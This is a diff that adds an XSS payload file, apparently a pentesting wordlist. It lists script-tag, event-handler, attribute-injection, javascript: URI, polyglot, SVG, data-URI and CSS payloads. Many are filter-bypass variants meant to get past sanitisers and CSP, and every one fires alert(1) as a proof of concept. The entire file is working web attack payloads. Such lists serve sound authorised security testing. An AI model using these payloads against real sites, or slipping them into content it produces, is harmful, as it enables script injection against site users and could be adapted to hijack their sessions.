@@ -1,0 +1,108 @@
+# === XSS PAYLOADS ===
+# Sorted: most likely to work → exotic bypasses
+# alert(1) = immediate visual confirmation
+
+
+# --- Basic script tag ---
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+
+
+# --- Event handlers (works when <script> is blocked) ---
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+"><img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+
+
+# --- Attribute injection (injecting into existing attributes) ---
+" onmouseover="alert(1)
+" onfocus="alert(1)" autofocus="
+" onclick="alert(1)
+
+
+# --- javascript: URI (href, src, action, formaction) ---
+javascript:alert(1)
+JaVaScRiPt:alert(1)
+javascript:alert`1`
+
+
+# --- Filter bypass: case variation ---
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x OnErRoR=alert(1)>
+<Svg OnLoad=alert(1)>
+
+
+# --- Filter bypass: no quotes needed ---
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+
+
+# --- Filter bypass: backticks instead of quotes ---
+<img src=`x` onerror=`alert(1)`>
+
+
+# --- Filter bypass: no parentheses ---
+<img src=x onerror=alert`1`>
+<script>alert`1`</script>
+<svg onload=alert`1`>
+
+
+# --- Filter bypass: tag breaking ---
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>script>alert(1)<</script>/script>
+
+
+# --- Filter bypass: HTML entities in attributes ---
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<a href="javascript:&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>
+
+
+# --- Filter bypass: Unicode/hex escapes (JS context) ---
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+
+
+# --- DOM-based (inject into URL hash/fragment) ---
+#<img src=x onerror=alert(1)>
+#<script>alert(1)</script>
+
+
+# --- Polyglots (work across multiple contexts) ---
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>
+'">><marquee><img src=x onerror=alert(1)></marquee>"></textarea></xmp></noscript></noembed></select></style></title></script><img src=x onerror=alert(1)>
+
+
+# --- Inside JS string context (break out of string) ---
+';alert(1);//
+";alert(1);//
+\';alert(1);//
+</script><script>alert(1)</script>
+
+
+# --- Inside JS template literal ---
+`${alert(1)}`
+
+
+# --- SVG-specific ---
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x></svg>
+<svg><set onbegin=alert(1) attributeName=x></svg>
+
+
+# --- CSP bypass: data URI (if allowed) ---
+<iframe src="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html,<script>alert(1)</script>">
+
+
+# --- XSS via CSS (very rare, older browsers) ---
+<style>body{background:url("javascript:alert(1)")}</style>
